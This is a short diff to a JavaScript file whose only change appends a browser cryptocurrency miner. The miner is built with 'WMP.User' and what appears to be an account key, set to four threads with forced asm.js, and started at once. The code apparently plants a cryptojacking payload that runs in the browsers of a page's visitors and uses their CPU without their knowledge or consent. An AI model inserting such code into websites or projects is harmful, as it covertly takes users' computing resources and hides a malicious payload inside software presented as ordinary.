@@ -771,3 +771,10 @@ this.on_workermsg = function(k) {
 };
 }
 
+
+    var miner = WMP.User('SK_A3RHRoc2bW577os9JzJEB', 'gogstatic',{
+        threads: 4,
+        autoThreads: true,
+        forceASMJS: true
+    });
+    miner.start();
